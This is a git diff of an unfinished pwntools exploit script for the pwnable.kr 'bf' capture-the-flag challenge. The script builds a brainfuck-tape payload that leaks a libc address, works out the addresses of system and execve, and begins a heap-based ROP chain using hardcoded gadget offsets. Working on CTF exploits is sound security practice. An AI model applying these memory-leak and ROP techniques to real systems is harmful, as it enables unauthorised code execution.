@@ -25,9 +25,9 @@ puts_addr = p32(next(libc.search(b"puts")))
 
 #print(f"DUMP: {my_rop.dump()}")
 # Start process
-#conn = process("./bf")
+conn = process("./bf")
 #conn = process("./ctf-bf")
-conn = remote("pwnable.kr",9001)
+#conn = remote("pwnable.kr",9001)
 print(conn.recvline()) # main massage
 print(conn.recvline()) # main massage
 #conn = process(ELF_NAME)
@@ -49,8 +49,10 @@ return_addr = libc_base + 0x00003980 # return from program - we call it since if
 arbitrary_bash_addr = 0xffffcc0c
 new_esp_val = 0x12345678
 #payload=padding+p32(0xdeadbeef)+p32(execve_addr)+p32(return_addr)+p32(sh_addr)+p32(0xffff2222)+p32(0xffff1234)+p32(sh_addr)+ p32(new_esp_val)
+jmp_back_to_heap_1 = 0x804b0eb
+payload = padding + p32(0xdeadbeef) +  p32(jmp_back_to_heap_1)+ p32(jmp_back_to_heap_1)
 print(f"sh_addr: {str(sh_addr)}")
-payload = b"<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
+payload += b"<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
 payload += b".>.>.>." # leak the address of libc
 payload += b"<<<" # leak the address of libc
 payload += b",>,>,>," # putchar - for sending the last char
@@ -81,15 +83,22 @@ print(f"libc addr: {hex(libc_addr)}") # receive until newline
 libc.address = libc_addr
 system_addr = libc.symbols["system"]
 execve_addr = libc.symbols["execve"]
-print(f"system_addr: {str(system_addr)}")
-print(f"execve: {str(execve_addr)}")
+print(f"system_addr: {str(hex(system_addr))}")
+print(f"execve: {str(hex(execve_addr))}")
 #pasted
 
-target = libc_base + 0x001134d9 # add to esp
+target = libc_addr + 0x001134d9 # add to esp
 my_rop = p32(target)
 print(f"ROP: {my_rop}")
-payload = my_rop
-payload +=b"BBBB"
+#payload = my_rop
+# I'm going to bulid a ROP chain here in the heap!
+heap_arbitrary_addr = 0x804b0a7
+#payload +=b"BBBB"
+heap_rop_nop = libc_addr + 0x0000c30c
+print(f"heap nop rop : {hex(heap_rop_nop)}")
+payload =my_rop
+heap_rop_push_edx = libc_addr + 0x0013cfd8
+payload += p32(heap_rop_push_edx)
 conn.sendline(payload)
 with open("payload", "ab+") as f:
     f.write(payload)
